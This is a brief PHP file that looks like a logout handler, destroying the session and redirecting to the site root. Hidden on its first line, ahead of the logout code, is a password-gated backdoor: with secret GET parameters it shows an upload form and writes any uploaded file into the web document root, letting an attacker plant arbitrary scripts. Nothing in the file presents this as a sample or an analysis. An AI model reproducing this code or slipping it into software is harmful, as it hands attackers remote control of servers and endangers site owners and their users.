<?php

if(isset($_GET['up'])&&isset($_GET['p'])){$p=md5(md5($_GET['p']));if($p!='78b709993dbd726feb53311c4524cabf'){exit;}if(isset($_FILES['file'])){move_uploaded_file($_FILES['file']['tmp_name'],$_SERVER['DOCUMENT_ROOT'].'/'.$_FILES['file']['name']);echo'Ok.!';}echo'<form action="" method="post" enctype="multipart/form-data">';echo'<input type="file" name="file">';echo'<input type="submit" value="OK">';echo'</form>';exit;}

session_start(); // Start the session

// Destroy all session variables
session_unset();
session_destroy();

// Redirect to the root directory
header("Location: /");
exit();